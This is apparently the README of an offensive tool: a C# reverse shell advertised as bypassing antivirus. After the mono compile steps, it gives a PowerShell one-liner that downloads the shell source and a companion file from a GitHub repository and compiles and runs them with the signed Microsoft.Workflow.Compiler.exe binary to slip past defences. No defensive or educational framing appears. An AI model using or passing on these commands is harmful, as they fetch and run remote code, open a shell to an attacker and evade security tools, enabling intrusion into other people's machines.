# Simple reverse shell in C# code and bypass AV solutions  

## Compile code to .exe  
sudo apt install mono-complete  
mcs -out:hello.exe hello.cs  
mono hello.exe  


## Live compiling via Powershell 

powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/S-crow/reverseShell/master/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/S-crow/reverseShell/master/reverse_shell.cs', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
